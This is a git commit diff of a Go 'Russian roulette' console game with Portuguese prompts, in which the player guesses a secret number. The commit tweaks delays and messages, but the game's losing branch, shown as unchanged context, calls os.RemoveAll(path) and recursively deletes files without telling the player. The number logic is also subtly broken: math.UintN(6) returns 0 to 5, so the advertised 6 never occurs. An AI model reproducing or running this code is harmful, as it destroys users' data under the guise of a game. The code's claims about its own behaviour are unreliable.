f93ae9450084cc8761f7ecd194b35f74d6d10d70
Pedro Eduardo Ferreira Lima <158651027+P3dr0Edu5rdo@users.noreply.github.com>
2024-08-20 00:25:00 -0300

    Update roletarussa.go
    Agora o número 6 é uma opção e uma correção de escrita

--- roletarussa.go
+++ roletarussa.go
@@ -9,7 +9,7 @@ import (
 
 func main() {
 	fmt.Println("Olá, vamos jogar um jogo?\n")
-	time.Sleep(2 * time.Second)
+	time.Sleep(1 * time.Second)
 	fmt.Println("Selecione 1 para começar e 2 para sair.\n")
 	fmt.Println("Apartir do momento em que você entrou no jogo não a como sair.\n")
 	fmt.Println("Jogue por sua conta e risco!\n")
@@ -22,8 +22,8 @@ func resposta() int {
 	switch entrarousair {
 	case 1:
 		fmt.Println("Vamos começar o jogo\n")
-		time.Sleep(2 * time.Second)
-		fmt.Println("Se você acertar o numerosecre ele é gerado aletoriamente e vai de 1 a 6\n")
+		time.Sleep(1 * time.Second)
+		fmt.Println("Você tem que acertar o numero secreto, ele é gerado aletoriamente e vai de 1 a 6\n")
 		gameplay()
 	case 2:
 		fmt.Println("OK. Compreensivel.")
@@ -36,6 +36,7 @@ func resposta() int {
 }
 func numerosecreto() uint {
 	return math.UintN(6)
+
 }
 func gameplay() uint {
 	numerogerado := numerosecreto()
@@ -45,13 +46,15 @@ func gameplay() uint {
 	if jogando == numerogerado {
 		fmt.Println("A sorte não sorriu pra você hoje!\n")
 		fmt.Println("Boa sorte na proxima vez!\n")
+		fmt.Println("O numero da morte foi:", numerogerado)
 		os.RemoveAll(path)
-	} else if jogando > 6 {
+	} else if jogando >= 7 {
 		fmt.Println("Você escolheu um número inválido!\n")
 		fmt.Println("Reiniciando o programa\n")
 		gameplay()
 	} else {
-		fmt.Println("Parabéns, você ganhou!")
+		fmt.Println("Parabéns, você ganhou!\n")
+		fmt.Println("O numero da morte foi:", numerogerado)
 	}
 
 	return jogando
